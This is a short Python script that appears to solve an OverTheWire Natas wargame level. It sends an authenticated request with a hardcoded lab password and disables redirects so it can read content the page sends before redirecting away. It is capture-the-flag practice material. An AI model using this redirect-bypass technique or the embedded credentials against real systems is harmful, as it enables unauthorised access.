import requests

target = 'http://natas22.natas.labs.overthewire.org/index.php?revelio=1'
user_auth = ('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')

for i in range(0,1):

    response = requests.post(target, auth = user_auth, allow_redirects = False)
    print(response.text)
    print(response.history)
